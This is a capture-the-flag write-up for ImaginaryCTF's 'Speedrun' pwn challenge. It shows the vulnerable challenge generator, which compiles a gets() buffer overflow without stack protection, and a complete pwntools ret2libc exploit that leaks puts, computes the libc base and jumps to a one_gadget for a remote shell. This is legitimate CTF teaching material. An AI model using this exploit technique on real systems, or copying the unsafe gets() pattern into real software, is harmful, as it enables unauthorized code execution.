# Speedrun (Pwn, 200 pts)

## Description

I've seen some teams solve pwn challenges almost instantly. I'm sure y'all wonder how. Well, you're about to find out!

## Attachment

[`speedrun.py`](speedrun.py)

## Solution

The given file:
```py
#!/usr/bin/env python3

import os
import sys
import subprocess
import base64
import random
import uuid
import time

code1 = '''
#include <stdio.h>

int main(void) {
	char inp['''

code2 = '''];
	setvbuf(stdout,NULL,2,0);
	setvbuf(stdin,NULL,2,0);
	gets(inp);
	puts("Thanks!");
}
'''

# Skipping through the art here because it takes too much line
# art = ''''''

def compile(size):
	filename = "/tmp/bin" + str(uuid.uuid4())
	open(filename + ".c", "w").write(code1 + str(size) + code2)
	subprocess.run(["gcc", "-o", filename, filename + ".c", "-fno-stack-protector", "-no-pie"], capture_output=True)
	os.remove(filename + ".c")
	return filename

def handler(signum, frame):
    print("Out of time!")

filename = compile(random.randint(20,1000))
binary = base64.b64encode(open(filename, "rb").read()).decode()
print(art)
print("I'll see you after you defeat the ender dragon!")

time.sleep(3)

print("---------------------------BEGIN  DATA---------------------------")
print(binary)
print("----------------------------END  DATA----------------------------")

subprocess.run([filename], stdin=sys.stdin, timeout=10)
os.remove(filename)
```
It creates a `c` file that uses `gets` and `puts`, and compiles it with `-fno-stack-protector` and `-no-pie`. Perfect for a `ret2libc`, but we have to automate it to run within 10 seconds. We are given a copy of the c file, encoded into base64; the length of the buffer is random. In steps:
1. Decode the base64 and compile it into a binary locally.
2. Find out how long the buffer is - achievable by making it crash via a cyclic pattern and inspecting the rsp of the core dump.
3. Get the libc version by leaking out `puts` address (and `gets` too, if there's too many libc versions). Since the libc version does not change, this could be done before the final execution that needs to be automated.
4. From the correct version of libc, get a gadget for getting the shell via `one_gadget`.
5. Send the full payload. Get shell.
6. ???
7. Profit!

The full script ([`speedrun.sol.py`](speedrun.sol.py)):
```py
#!/usr/bin/env python3

import base64
from pwn import *

#p = process(['python3', './speedrun.py'])
p = remote('chal.imaginaryctf.org', '42020')
p.recvuntil("---------------------------BEGIN  DATA---------------------------")
bin_64 = p.recvuntil("----------------------------END  DATA----------------------------")
p.clean()
bin_64 = bin_64[:-66]
bincode = base64.b64decode(bin_64)
with open('speedrun_bin', 'wb') as f:
    f.write(bincode)
binelf = './speedrun_bin'
elf = ELF(binelf)

# get offset from the binary data
binproc = process(binelf)
binproc.sendline(cyclic(1000))
binproc.wait()
core = binproc.corefile
stack = core.rsp
pattern = core.read(stack,4)
rip_offset = cyclic_find(pattern)
print("offset=>"+str(rip_offset))
padding = b'\x00'*rip_offset

# ROP basics
r = ROP(elf)
libc = ELF('./libc6_2.28-10_amd64.so')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']
rdi_ret = (r.find_gadget(['pop rdi', 'ret']))[0]
binsh = 0x4484f # requires rax == NULL; before execution of binsh, main terminates returning 0.

# leak puts address
payload = padding + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
p.sendline(payload)
p.recvline()
rcv = p.recvline().strip()
puts_addr = u64(rcv.ljust(8,b'\x00'))
print("puts_addr=>"+hex(puts_addr))

# compute libc_base and binsh addresses
libc_base = puts_addr - libc.symbols['puts']
binsh = libc_base + binsh

# send payload; shell
payload = padding + p64(binsh)
p.sendline(payload)
print(p.recvline())
print("====SHELL====")
p.interactive()
```

## Flag
```
ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}
```
